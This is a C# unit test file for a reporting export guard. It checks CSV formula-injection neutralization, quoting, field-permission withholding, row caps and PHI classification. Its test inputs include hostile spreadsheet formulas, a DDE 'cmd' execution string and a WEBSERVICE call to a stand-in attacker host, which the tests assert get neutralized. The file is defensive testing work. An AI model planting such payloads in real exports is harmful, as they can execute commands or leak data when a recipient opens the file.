using Edpf.Abstractions.Identity;
using Edpf.Abstractions.Metadata;
using Edpf.Abstractions.Primitives;
using Edpf.Metadata;
using Edpf.Reporting;

namespace Edpf.UnitTests.Reporting;

/// <summary>
/// Phase 33b — export as a security boundary.
/// </summary>
public sealed class ExportBoundaryTests
{
    private static readonly Guid Tenant = Guid.Parse("aaaaaaaa-0000-0000-0000-000000000001");
    private static readonly DateTimeOffset Now = new(2026, 8, 2, 12, 0, 0, TimeSpan.Zero);

    private static EntityMetadata Metadata() => new(
        "SubjectRecord",
        "SUBJECT_RECORD",
        [
            new FieldMetadata("Id", "Id", typeof(Guid), DataClassificationLevel.Internal,
                isFilterable: true, isSortable: true),
            new FieldMetadata("DisplayLabel", "DisplayLabel", typeof(string),
                DataClassificationLevel.Internal, isFilterable: true, isSortable: true),
            new FieldMetadata("RecordNumber", "RecordNumber", typeof(string),
                DataClassificationLevel.Phi),
            new FieldMetadata("Compensation", "Compensation", typeof(decimal),
                DataClassificationLevel.Internal, isFilterable: true, isSortable: true,
                requiredScope: "compensation.read"),
            new FieldMetadata("InternalNote", "InternalNote", typeof(string),
                DataClassificationLevel.Internal, isProjectable: false),
        ]);

    private static Result<ExportManifest> Plan(
        IReadOnlyList<string> columns, int rowLimit = 0, params string[] granted)
        => new ExportGuard().Plan(
            "monthly", Metadata(), columns, new FieldPermissionSet(granted),
            Tenant, "analyst-7", Now, rowLimit);

    // ── formula injection ──────────────────────────────────────────────────

    [Theory]
    [InlineData("=1+1")]
    [InlineData("+1+1")]
    [InlineData("-1+1")]
    [InlineData("@SUM(A1)")]
    [InlineData("=cmd|'/c calc'!A1")]
    [InlineData("=WEBSERVICE(\"http://attacker.example/x\")")]
    public void CellThatWouldExecuteInASpreadsheet_IsNeutralized(string hostile)
    {
        // A spreadsheet is a program and a CSV cell is source code for it
        // (CWE-1236). Someone types this into a free-text notes field, it sits
        // inertly for months, then a monthly report exports it and a finance
        // manager double-clicks the file.
        var writer = new DelimitedTextWriter();

        string cell = writer.Neutralize(hostile);

        Assert.StartsWith("'", cell, StringComparison.Ordinal);
        Assert.EndsWith(hostile, cell, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("\t=cmd")]
    [InlineData("\r=cmd")]
    public void LeadingWhitespaceFormsAreAlsoNeutralized(string hostile)
    {
        // Several importers strip leading whitespace BEFORE deciding whether
        // the remainder is a formula, which puts these straight back into the
        // dangerous case.
        Assert.StartsWith("'", new DelimitedTextWriter().Neutralize(hostile), StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("Okonkwo")]
    [InlineData("1500")]
    [InlineData("a=b")]
    [InlineData("")]
    public void OrdinaryValues_AreLeftAlone(string benign)
    {
        // Neutralisation changes data, so it must apply only where it must.
        // "a=b" matters: the '=' is not leading, so the cell is inert.
        Assert.Equal(benign, new DelimitedTextWriter().Neutralize(benign));
    }

    [Fact]
    public void QuotingAloneIsNotRelied_On_ForFormulaSafety()
    {
        // A CSV field written as "=1+1" is still parsed as a formula by Excel:
        // the quotes are CSV syntax, consumed before the cell value is
        // interpreted. So the row must carry the text marker, not just quotes.
        string row = new DelimitedTextWriter().WriteRow(["=1+1", "safe"]);

        Assert.StartsWith("'=1+1", row, StringComparison.Ordinal);
    }

    [Fact]
    public void NeutralizationCanBeDisabled_ButIsOnByDefault()
    {
        // The flag exists so the choice is explicit and reviewable, not so it
        // is convenient.
        Assert.True(new DelimitedTextWriter().NeutralizeFormulas);
        Assert.Equal("=1+1", new DelimitedTextWriter(neutralizeFormulas: false).Neutralize("=1+1"));
    }

    // ── delimited correctness ──────────────────────────────────────────────

    [Fact]
    public void ValueContainingTheDelimiter_IsQuoted()
    {
        // An unquoted delimiter shifts every subsequent column by one for that
        // row — the single most common way an export is silently wrong.
        Assert.Equal("\"a,b\",c", new DelimitedTextWriter().WriteRow(["a,b", "c"]));
    }

    [Fact]
    public void EmbeddedQuotes_AreDoubled()
    {
        Assert.Equal("\"say \"\"hi\"\"\"", new DelimitedTextWriter().WriteRow(["say \"hi\""]));
    }

    [Fact]
    public void ValueContainingANewline_IsQuoted()
    {
        Assert.Equal("\"line1\nline2\"", new DelimitedTextWriter().WriteRow(["line1\nline2"]));
    }

    [Fact]
    public void NullCell_WritesEmpty()
    {
        Assert.Equal("a,,b", new DelimitedTextWriter().WriteRow(["a", null, "b"]));
    }

    [Fact]
    public void QuoteCannotBeChosenAsTheDelimiter()
    {
        Assert.Throws<ArgumentOutOfRangeException>(() => new DelimitedTextWriter('"'));
    }

    // ── the second enforcement point (ADR-031's revisit trigger) ───────────

    [Fact]
    public void ColumnTheRequesterCannotRead_IsWithheldFromTheExport()
    {
        // ADR-031 put field authorization in the query compiler and named
        // "a second enforcement point appears — bulk export" as its revisit
        // trigger. An export that skipped the check would be the obvious way
        // around every control the query layer applies.
        ExportManifest manifest = Plan(["Id", "Compensation"]).Value;

        Assert.DoesNotContain("Compensation", manifest.Columns);
        Assert.Contains("Compensation", manifest.WithheldColumns);
    }

    [Fact]
    public void ColumnTheRequesterCanRead_IsIncluded()
    {
        ExportManifest manifest = Plan(["Id", "Compensation"], 0, "compensation.read").Value;

        Assert.Contains("Compensation", manifest.Columns);
        Assert.Empty(manifest.WithheldColumns);
    }

    [Fact]
    public void ExportWithholdsRatherThanRefuses_UnlikeTheQueryCompiler()
    {
        // A report definition is a long-lived artefact edited by one person
        // and run by many. Failing the whole run because one recipient lacks
        // one column means the report stops working for most of the
        // organisation, and the response to that is always to grant everyone
        // the permission.
        Result<ExportManifest> result = Plan(["Id", "Compensation"]);

        Assert.True(result.IsSuccess);
        Assert.Contains("Id", result.Value.Columns);
    }

    [Fact]
    public void WithheldColumns_AreRecorded_NotSilentlyDropped()
    {
        // A recipient who does not know a column was removed will read the
        // export as complete, and act on it (same argument as ADR-028's
        // ValuesWithheld).
        ExportManifest manifest = Plan(["Id", "Compensation"]).Value;

        Assert.Contains("withheld", manifest.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void NonProjectableColumn_IsWithheld()
    {
        ExportManifest manifest = Plan(["Id", "InternalNote"]).Value;

        Assert.Contains("InternalNote", manifest.WithheldColumns);
    }

    [Fact]
    public void UnknownColumn_FailsRatherThanBeingDropped()
    {
        // Silently dropping it would produce a report missing a column nobody
        // notices is missing.
        Assert.True(Plan(["Id", "Nonexistent"]).IsFailure);
    }

    [Fact]
    public void ExportWhereNothingIsReadable_IsRefused()
    {
        var metadata = new EntityMetadata(
            "Locked", "LOCKED",
            [
                new FieldMetadata("Secret", "Secret", typeof(string), DataClassificationLevel.Internal,
                    requiredScope: "nobody.has.this"),
            ]);

        Result<ExportManifest> result = new ExportGuard().Plan(
            "locked", metadata, [], FieldPermissionSet.None, Tenant, "analyst-7", Now, 0);

        Assert.True(result.IsFailure);
        Assert.Equal(ErrorCodes.FieldAccessDenied, result.Error!.Code);
    }

    // ── caps ───────────────────────────────────────────────────────────────

    [Fact]
    public void RequestedRowLimit_IsClampedNotHonoured()
    {
        // A cap the caller can raise is not a cap. BRL-018 makes the same
        // choice for page size.
        ExportManifest manifest = Plan(["Id"], rowLimit: int.MaxValue).Value;

        Assert.Equal(ExportGuard.DefaultMaximumRows, manifest.RowLimit);
    }

    [Fact]
    public void SmallerRequestedLimit_IsRespected()
    {
        Assert.Equal(500, Plan(["Id"], rowLimit: 500).Value.RowLimit);
    }

    [Fact]
    public void ThereIsNoUnlimitedOption()
    {
        // An unbounded export over a multi-tenant clinical dataset is an
        // exfiltration channel that looks exactly like a report.
        Assert.Equal(ExportGuard.DefaultMaximumRows, Plan(["Id"], rowLimit: 0).Value.RowLimit);
        Assert.Throws<ArgumentOutOfRangeException>(() => new ExportGuard(maximumRows: 0));
    }

    // ── the artefact inherits its classification ───────────────────────────

    [Fact]
    public void ExportContainingPhi_IsItselfAPhiArtefact()
    {
        // A CSV containing one PHI column is a PHI artefact, and the file's
        // storage, transport and retention must be governed accordingly.
        ExportManifest manifest = Plan(["Id", "RecordNumber"]).Value;

        Assert.Equal(DataClassificationLevel.Phi, manifest.HighestClassification);

        DataProtectionRequirements protection = new ExportGuard().ArtefactProtection(manifest);

        Assert.True(protection.HasFlagSet(DataProtectionRequirements.EncryptAtRest));
        Assert.True(protection.HasFlagSet(DataProtectionRequirements.AuditAccess));
    }

    [Fact]
    public void ClassificationIsTheHighestPresent_NotTheFirstOrLast()
    {
        ExportManifest manifest = Plan(["RecordNumber", "DisplayLabel"]).Value;

        Assert.Equal(DataClassificationLevel.Phi, manifest.HighestClassification);
    }

    [Fact]
    public void ManifestSummary_CarriesNoExportedValues()
    {
        // The manifest is logged; the data is not.
        ExportManifest manifest = Plan(["Id", "RecordNumber"]).Value;

        string summary = manifest.ToString();

        Assert.Contains("analyst-7", summary, StringComparison.Ordinal);
        Assert.Contains("monthly", summary, StringComparison.Ordinal);
        Assert.Contains("Phi", summary, StringComparison.Ordinal);
    }

    [Fact]
    public void DefaultColumnSet_IsStablyOrdered()
    {
        // A downstream consumer parsing by position must not break when the
        // metadata dictionary rehashes.
        IReadOnlyList<string> first = Plan([]).Value.Columns;
        IReadOnlyList<string> second = Plan([]).Value.Columns;

        Assert.Equal(first, second);
        Assert.DoesNotContain("InternalNote", first);
    }
}
